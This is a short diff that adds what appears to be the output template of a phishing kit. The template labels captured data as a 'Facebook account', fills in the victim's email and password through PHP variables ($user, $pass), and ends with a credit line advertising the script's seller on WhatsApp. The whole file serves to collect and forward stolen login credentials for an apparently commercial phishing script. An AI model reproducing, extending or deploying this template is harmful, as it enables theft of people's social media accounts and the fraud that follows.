@@ -1,0 +1,9 @@
+-===¦ Akun Facebook ¦===-
+<p>
+|>> Email : '.$user.'
+<p>
+|>> Password : '.$pass.'
+<p>
+-===¦ Thanks ¦===-
+<p>
+ReeditScript Chat Di WA: https://ahmads.wasap.my
